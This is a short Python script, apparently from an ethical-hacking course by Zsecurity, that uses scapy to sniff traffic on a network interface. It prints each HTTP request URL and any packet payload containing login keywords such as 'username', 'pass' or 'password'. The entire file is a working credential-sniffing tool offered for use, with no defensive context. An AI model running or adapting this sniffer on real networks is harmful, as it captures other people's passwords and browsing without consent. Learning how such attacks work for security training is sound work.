# Date : October 11th 2023
# Original Author : Zaid Sabih , Zsecurity
# Edited by : Faris Mohammad 
# Revision : 1
# Note : 

# Description : This program sniffs packets going over a defined interface and looks for keywords to return the data associated
#               with the keywords, in this case username and passwords. It also prints any HTTP URls
#               

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    print("initialising interface")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ['username', 'user', 'login', 'password', 'pass', 'passwd']
            for keywords in keywords:
                if keywords in load:
                    return load
                

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(get_url(packet))
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
sniff("eth0")
